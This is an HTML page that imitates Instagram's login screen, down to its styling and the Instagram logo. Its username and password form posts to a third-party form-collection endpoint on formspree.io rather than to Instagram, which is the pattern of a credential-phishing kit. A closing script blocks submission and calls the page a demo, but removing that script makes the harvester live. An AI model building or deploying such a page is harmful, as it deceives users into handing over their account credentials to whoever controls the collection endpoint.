<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    /* Basic Reset and Styling */
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      width: 350px;
      padding: 40px 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }

    .logo {
      display: block;
      margin: 0 auto 20px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      margin-bottom: 6px;
      padding: 8px 0 8px 8px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }

    button {
      margin-top: 8px;
      background-color: #3897f0;
      border: none;
      padding: 8px 0;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.5;
      cursor: default;
    }

    .divider {
      margin: 24px 0 16px;
      display: flex;
      align-items: center;
      color: #999;
      font-weight: 600;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider:not(:empty)::before {
      margin-right: 10px;
    }

    .divider:not(:empty)::after {
      margin-left: 10px;
    }

    .signup-text {
      margin-top: 16px;
      font-size: 14px;
      text-align: center;
    }

    .signup-text a {
      color: #3897f0;
      font-weight: 600;
      text-decoration: none;
    }

    /* Responsive adjustments */
    @media(max-width: 400px) {
      .login-container {
        width: 90%;
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Instagram Logo -->
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo" width="175" />

    <!-- Login Form -->
    <form id="loginForm" action="https://formspree.io/f/mojnyook" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <!-- Divider -->
    <div class="divider">OR</div>

    <!-- Forgot Password Link -->
    <div style="text-align:center; margin-bottom:20px;">
      <a href="#" style="color:#00376b; font-weight:600; font-size:14px;">Forgot password?</a>
    </div>

    <!-- Sign Up Section -->
    <div class="signup-text">
      <span>Don't have an account? </span>
      <a href="#">Sign up</a>
    </div>
  </div>

  <script>
    // Optional: Add some simple form validation or handling
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault(); // Prevent actual submission for demo
      alert('Login form submitted!');
    });
  </script>
</body>
</html>
